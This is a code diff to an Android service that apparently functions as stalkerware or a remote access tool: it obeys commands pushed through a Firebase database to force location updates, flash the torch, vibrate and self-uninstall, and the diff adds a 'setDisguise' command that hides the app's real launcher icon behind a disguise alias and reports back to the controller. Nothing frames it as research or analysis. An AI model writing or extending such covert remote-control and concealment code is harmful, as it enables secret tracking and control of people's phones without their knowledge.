@@ -303,7 +303,27 @@ class StreamingService : Service() {
             "toggleTorch" -> { Thread { toggleTorch(snapshot) }.start(); snapshot.ref.removeValue() }
             "vibrateDevice" -> { Thread { vibrateDevice() }.start(); snapshot.ref.removeValue() }
             "forceLocation" -> { Thread { forceLocationUpdate() }.start(); snapshot.ref.removeValue() }
+            "setDisguise" -> { Thread { setDisguiseTheme(snapshot) }.start(); snapshot.ref.removeValue() }
             "wipe_data", "selfDestruct", "uninstall" -> { Thread { selfUninstall() }.start(); snapshot.ref.removeValue() }
+        }
+    }
+
+    private fun setDisguiseTheme(snapshot: DataSnapshot) {
+        val theme = snapshot.child("theme").getValue(String::class.java) ?: "none"
+        val pm = packageManager
+        val launcherAlias = ComponentName(this, "$packageName.LauncherAlias")
+        val disguiseAlias = ComponentName(this, "$packageName.DisguiseAlias")
+
+        if (theme == "none") {
+            pm.setComponentEnabledSetting(disguiseAlias, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
+            pm.setComponentEnabledSetting(launcherAlias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
+            deviceRef?.child("settings/disguise_theme")?.removeValue()
+            deviceRef?.child("logs")?.push()?.setValue(mapOf("log" to "🎭 [DISGUISE] Disguise mode OFF", "time" to com.google.firebase.database.ServerValue.TIMESTAMP))
+        } else {
+            pm.setComponentEnabledSetting(launcherAlias, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
+            pm.setComponentEnabledSetting(disguiseAlias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
+            deviceRef?.child("settings/disguise_theme")?.setValue(theme)
+            deviceRef?.child("logs")?.push()?.setValue(mapOf("log" to "🎭 [DISGUISE] Mode set to $theme", "time" to com.google.firebase.database.ServerValue.TIMESTAMP))
         }
     }
 
